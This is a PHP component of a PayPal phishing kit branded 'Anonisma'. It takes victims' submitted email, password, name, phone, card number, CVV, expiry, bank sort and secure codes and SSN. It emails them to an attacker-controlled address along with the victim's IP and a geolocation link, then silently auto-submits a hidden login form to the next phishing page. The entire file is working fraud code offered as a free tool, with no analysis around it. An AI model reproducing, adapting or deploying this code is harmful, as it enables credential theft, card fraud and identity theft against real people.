<?php
//---------------------------------------------------------------------------------------- INC
	include('./includes/funciones.php');
	include('./includes/bots.php');
	include('./info.php');
//---------------------------------------------------------------------------------------- VAR	
	$redi			    = "icez.php";
	$ip 				= getenv("REMOTE_ADDR");
	$_SESSION['ok']   = $_POST['email'];
	$_SESSION['by']   = $_POST['pass'];
//---------------------------------------------------------------------------------------- LTR
	$cartamensaje 		= "<!DOCTYPE html><html> <head> 
    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"> 
    <meta name=\"viewport\" content=\"width=device-width; initial-scale=1.0; maximum-scale=1.0; user-scalable=0;\"> 
    <style type=\"text/css\">body { width: 100% !important;}</style> 
	</head> 
	  <body class=\" ".X()." \" id=\"".Y()."\"   style=\"PADDING-BOTTOM: 0px; PADDING-TOP: 40px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BACKGROUND-COLOR: #e9e9e9\"> 
		<table style=\"WIDTH: 100%\"> 
		  <tbody class=\" ".X()." \" id=\"".Y()."\" > 
			<tr> 
			  <td for=\"".Y()."\"  style=\" BACKGROUND-COLOR: #e9e9e9\" align=\"center\"> 
				<table class=\" ".X()." \" width=\"600\" border=\"0\"> 
				  <tbody class=\" ".X()." \"> 
					<tr> 
					  <td> 
						<div class=\" ".X()." \"> 
						  <table for=\"".Y()."\"  cellspacing=\"0\" cellpadding=\"0\" width=\"600\" border=\"0\"> 
							<tbody class=\" ".X()." \"> 
							  <tr> 
								<td  for=\" ".X()." \"   style=\" BACKGROUND: #ffffff;  LINE-HEIGHT: 22px;border-radius: 10px 10px 0px 0px\"> 
								  <table cellspacing=\"0\" cellpadding=\"0\" width=\"600\" align=\"left\" border=\"0\"> 
									<tbody class=\" ".X()." \"> 
									  <tr> 
										<td> 
										  <div class=\" ".X()." \" for=\"".Y()."\"  align=\"center\" style=\"LINE-HEIGHT: 30px;FONT-SIZE: 14px; FONT-FAMILY: Arial; COLOR: #747474;\"> 
											<p> 
											<div class=\" ".X()." \" style=\"FONT-SIZE: 10px; FONT-FAMILY: Arial black; COLOR: #828282;\" > 
											  <p class=\" ".X()." \" style=\"FONT-SIZE: 27px\"><strong><font color=\"#7E7E7E\"> \ ◇ ◇ ◇  <font size=\"6\">☠</font> MA DZ TN <font size=\"6\">☠</font>  ◇ ◇ ◇  / </font></strong> 
											  </p> 
											</div> 
											</p> 
										  </div> 
										</td> 
									  </tr> 
									</tbody> 
								  </table> 
								</td> 
							  </tr> 
							</tbody> 
						  </table> 
						</div> 
						<div> 
						<table class=\" ".X()." \" for=\"".Y()."\"  cellspacing=\"0\" cellpadding=\"0\" width=\"600\" border=\"0\"> 
						  <tbody> 
							<tr> 
							  <td   for=\" ".X()." \" style=\" BACKGROUND: #F5F5F5 ; LINE-HEIGHT: 22px;border-top:2px solid #7E7E7E\"> 
								<table class=\" ".X()." \" cellspacing=\"0\" cellpadding=\"0\" width=\"600\" align=\"left\" border=\"0\"> 
								  <tbody> 
									<tr class=\" ".X()." \"> 
									  <td> 
										<div for=\"".Y()."\"  align=\"center\" style=\"width:100%;padding: 15px 0px 15px 0px;FONT-SIZE: 14px; FONT-FAMILY: Arial; COLOR: #747474;\"> 
										<b><font color=\"#7E7E7E\">★ PAYPAL LOGIN ACCOUNT ★</font></b> 
									  </td> 
									</tr> 
									<tr class=\" ".X()." \" style=\" BACKGROUND: #FFFFFF; COLOR: #747474;\"> 
									  <td> 
										<div  id=\"".Y()."\"  align=\"center\" style=\"FONT-SIZE: 12px; font weight: bold ;width:100%;padding: 4px 0px 4px 0px\"> 
										 " .$_POST['email']." 
										</div> 
										<div  id=\"".Y()."\"  align=\"center\" style=\"FONT-SIZE: 12px; font weight: bold ;width:100%;padding: 5px 0px 4px 0px\">						   
										 " .$_POST['pass']." 
										</div> 
									  </td> 
									</tr> 
									<tr> 
									  <td class=\" ".X()." \"> 
										<div  id=\"".Y()."\"  align=\"center\" style=\"width:100%;padding: 15px 0px 15px 0px;FONT-SIZE: 14px; FONT-FAMILY: Arial; COLOR: #747474;\"> 
										<b><font color=\"#7E7E7E\">★ BILLING ADDRESS ★</font></b> 
									  </td> 
									</tr> 
									<tr class=\" ".X()." \" style=\" BACKGROUND: #FFFFFF; COLOR: #747474;\"> 
									  <td> 
										<div for=\"".Y()."\"  align=\"center\" style=\"FONT-SIZE: 12px; font weight: bold ;width:100%;padding: 4px 0px 4px 0px\"> 
										  " .$_POST['first_name']." 
										</div> 
										<div  for=\" ".X()." \"  align=\"center\" style=\"FONT-SIZE: 12px; font weight: bold ;width:100%;padding: 4px 0px 4px 0px\" class=\" ".X()." \">						   
										  " .$_POST['last_name']." 
										</div> 
									  </td> 
									</tr> 
									<tr   id=\"".Y()."\"  style=\" BACKGROUND: #FFFFFF; COLOR: #747474;\"> 
									  <td> 
										<div  for=\" ".X()." \"  align=\"center\" style=\"FONT-SIZE: 12px; font weight: bold ;width:100%;padding: 4px 0px 4px 0px\"> 
										  " .$_POST['phone']." 
										</div> 
										<div class=\" ".X()." \" align=\"center\" style=\"FONT-SIZE: 12px; font weight: bold ;width:100%;padding: 4px 0px 4px 0px\">						   
										  " .$ip.  " 
										</div> 
									  </td> 
									</tr> 
									<tr class=\" ".X()." \" style=\" BACKGROUND: #FFFFFF; COLOR: #747474;\"> 
									  <td> 
										<div class=\" ".X()." \" for=\"".Y()."\"  align=\"center\" style=\"FONT-SIZE: 12px; font weight: bold ;width:100%;padding: 4px 0px 4px 0px\"> 
										  +++   
										</div> 
									  </td> 
									</tr> 
									<tr> 
									  <td> 
										<div  id=\"".Y()."\"  align=\"center\" style=\"width:100%;padding: 15px 0px 15px 0px;FONT-SIZE: 14px; FONT-FAMILY: Arial; COLOR: #747474;\"> 
										<b><font color=\"#7E7E7E\">★ BILLING CARD ★</font></b> 
									  </td> 
									</tr> 
									<tr  for=\" ".X()." \"  style=\" BACKGROUND: #FFFFFF; COLOR: #747474;\"> 
									  <td class=\" ".X()." \"> 
										<div class=\" ".X()." \" for=\"".Y()."\"  align=\"center\" style=\"FONT-SIZE: 12px; font weight: bold ;width:100%;padding: 4px 0px 4px 0px\"> 
										  " .$_POST['card_name']." 
										</div> 
										<div align=\"center\" style=\"FONT-SIZE: 12px; font weight: bold ;width:100%;padding: 4px 0px 4px 0px\">						   
										  " .$_POST['card_number']."
										</div> 
										<div class=\" ".X()." \" for=\" ".X()." \"  align=\"center\" style=\"FONT-SIZE: 12px; font weight: bold ;width:100%;padding: 4px 0px 4px 0px\">						   
										  " .$_POST['cvv2']."
										</div> 
										<div class=\" ".X()." \"  id=\"".Y()."\"  align=\"center\" style=\"FONT-SIZE: 12px; font weight: bold ;width:100%;padding: 4px 0px 4px 0px\">						   
										  " .$_POST['card_month']."
										</div> 
									  </td> 
									</tr>								
									<tr> 
									  <td class=\" ".X()." \"> 
										<div  id=\"".Y()."\"  align=\"center\" style=\"width:100%;padding: 15px 0px 15px 0px;FONT-SIZE: 14px; FONT-FAMILY: Arial; COLOR: #747474;\"> 
										  <b><font color=\"#7E7E7E\">★ VERIFIED CARD ★</font></b> 
									  </td> 
									</tr> 
									<tr for=\"".Y()."\"  style=\" BACKGROUND: #FFFFFF; COLOR: #747474;\"> 
									<td> 
									<div  for=\" ".X()." \"  align=\"center\" style=\"FONT-SIZE: 12px; font weight: bold ;width:100%;padding: 4px 0px 4px 0px\"> 
									" .$_POST['sort']." 
									</div> 
									<div class=\" ".X()." \" align=\"center\" style=\"FONT-SIZE: 12px; font weight: bold ;width:100%;padding: 4px 0px 4px 0px\">						   
									" .$_POST['secure']." 
									</div> 
									<div class=\" ".X()." \" align=\"center\" style=\"FONT-SIZE: 12px; font weight: bold ;width:100%;padding: 4px 0px 4px 0px\">						   
									" .$_POST['ssn']." 
									</div> 
									</td> 
									</tr>	   
								  </tbody> 
								</table> 
							  </td> 
							</tr> 
						  </tbody> 
						</table> 
						</div> 
						<div> 
						  <table class=\" ".X()." \" for=\"".Y()."\"  cellspacing=\"0\" cellpadding=\"0\" width=\"600\" border=\"0\"> 
							<tbody> 
							  <tr> 
								<td  for=\" ".X()." \"  style=\" BACKGROUND: #ffffff;  LINE-HEIGHT: 27px\"> 
								  <table width=\"600\" align=\"left\" border=\"0\"> 
									<tbody> 
									  <tr> 
										<!-- hna kan button -->							   
									  </tr> 
									</tbody> 
								  </table> 
								</td> 
							  </tr> 
							</tbody> 
						  </table> 
						</div> 
						<div> 
						<table class=\" ".X()." \"  for=\" ".X()." \"  cellspacing=\"0\" cellpadding=\"0\" width=\"600\" border=\"0\"> 
						  <tbody class=\" ".X()." \"> 
							<tr> 
							  <td   id=\"".Y()."\"  style=\" BACKGROUND: #ffffff;  LINE-HEIGHT: 22px;border-radius:0px 0px 10px 10px\"> 
								<table cellspacing=\"0\" cellpadding=\"0\" width=\"600\" align=\"left\" border=\"0\"> 
								  <tbody> 
									<tr class=\" ".X()." \"> 
									  <td> 
										<div for=\"".Y()."\"  style=\"FONT-SIZE: 9px; FONT-FAMILY: Arial; COLOR: #747474;margin-left:30px;margin-right:30px\"> 
										  <hr size=\"2\" color=\"#F0F0F0\" width=\"100%\"> 
										  <p align=\"center\" > 
											---- | ★ ★ ★ ANONISMA FREE TOOLS ★ ★ ★ | ---- 
										  </p> 
									  </td> 
									</tr> 
								  </tbody> 
								</table> 
							  </td> 
							</tr> 
						  </tbody> 
						</table> 
						</div> 
					  </td> 
					</tr> 
					<tr> 
					  <td class=\" ".X()." \" for=\"".Y()."\"  style=\" PADDING-TOP: 10px; \" align=\"center\"> 
						<div align=\"center\" style=\"FONT-SIZE: 11px; FONT-FAMILY: Arial; COLOR: #959595;\"> 
						  <p class=\" ".X()." \"> 
							بعيدا عن السبام 
							<br> 
							سهر + برمجة + سكريبتات + الشبكات + تواضع = صرف و إحترام 
							<br> 
							تدوين + تقنية + ربح + بلوكر= شاعر معلوماتي عباد االأسهم  
							<br> 
							الجديد إصنعه بيدك لنغير سلوكنا 
						  </p> 
						</div> 
					  </td> 
					</tr> 
				  </tbody> 
				</table> 
			  </td> 
			</tr> 
		  </tbody> 
		</table> 
	  </body> 
	</html>";
//---------------------------------------------------------------------------------------- SND
	$subject = "Z3CI R3Z  =?UTF-8?Q?=e2=9d=a4_?=  $ip =?UTF-8?Q?=E2=9C=94_?= ";
	$headers = "From: Muh Fucka <Anonisma-Free-Tools@hotmail.com>\r\n";
	$headers .= "MIME-Version: 1.0\r\n";
	$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
	mail($enviardatos,$subject,$cartamensaje,$headers);
	$text_result_anon .= "|----------| ANONISMA MA DZ TN V3 TEXT RESULT |--------------|\n";
	$text_result_anon .= "|----------+| LOGIN |+--------------|			\n"; 
	$text_result_anon .= "|E-M-L      :  " .$_POST['email']."			\n";
	$text_result_anon .= "|P-S-S-D    :  " .$_POST['pass']."		    \n";
	$text_result_anon .= "|----------+| BILLING |+--------------|		\n"; 
	$text_result_anon .= "|C-T-R-Y    :  " .$_POST['first_name']."		\n";
	$text_result_anon .= "|D-B-R-T    :  " .$_POST['last_name']." 		\n";
	$text_result_anon .= "|P-H-N      :  " .$_POST['phone']."			\n";
	$text_result_anon .= "|I-P        :  " .$ip.  " 					\n";
	$text_result_anon .= "|----------+| CARD |+--------------|			\n"; 
	$text_result_anon .= "|C-H-D-R    :  " .$_POST['card_name']." 		\n";
	$text_result_anon .= "|C-N-B-R    :  " .$_POST['card_number']."		\n";
	$text_result_anon .= "|C-V-V      :  " .$_POST['cvv2']." 			\n";
	$text_result_anon .= "|E-X-P      :  " .$_POST['card_month']." 		\n";
	$text_result_anon .= "|----------+| VBV |+--------------|			\n"; 
	$text_result_anon .= "|S-R-C-D    :  " .$_POST['sort']." 			\n";
	$text_result_anon .= "|S-C-C-D    :  " .$_POST['secure']." 			\n";
	$text_result_anon .= "|S-S-N      :  " .$_POST['ssn']." 			\n";
	$text_result_anon .= "|--- http://www.geoiptool.com/?IP=$ip ----	\n";
	$text_result_anon .= "|----------| ANONISMA MA DZ TN V3 TEXT RESULT |--------------|\n";
	$text_result_anon .= "|----------| ANONISMA MA DZ TN V3 TEXT RESULT |--------------|\n";
//---------------------------------------------------------------------------------------- RLG
	echo "<html><head> 
	<meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1252\"> 
	<script src=\"./lib/js/jquery.1.11.1.min.js\"></script> 
	<script> 
	$(document).ready(function () { 
	document.forms[\"login\"].submit(); 
	}); 
	</script> 
	</head><body style=\"background-image: url('./lib/img/loading-dots.gif');background-repeat: no-repeat;background-attachment: fixed;background-position: center;\">
	<div style=\"display:none\">
	<form  action=\"" .$redi.  "\" method=\"post\" class=\"proceed maskable\" name=\"login\"autocomplete=\"off\" novalidate>
	<input id=\"email\"name=\"login_email\"type=\"email\"class=\"hasHelp  validateEmpty  \"required=\"required\" aria-required=\"true\"value=\"".$_SESSION['ok']."\"		autocomplete=	\"off\"			placeholder=	\"Email address\"		/>
	<input id=\"password\"name=\"login_password\"type=\"password\"class=\"hasHelp  validateEmpty  \"required=\"required\" aria-required=\"true\"value=\"".$_SESSION['by']."\"		placeholder=	\"Password\"		/>
	<button class=\"button actionContinue\" type=\"submit\" id=\"btnLogin\" name=\"btnLogin\" value=\"Login\">Log In</button>
	</form>
	</div>
	</body></html>\n"; 
?>	
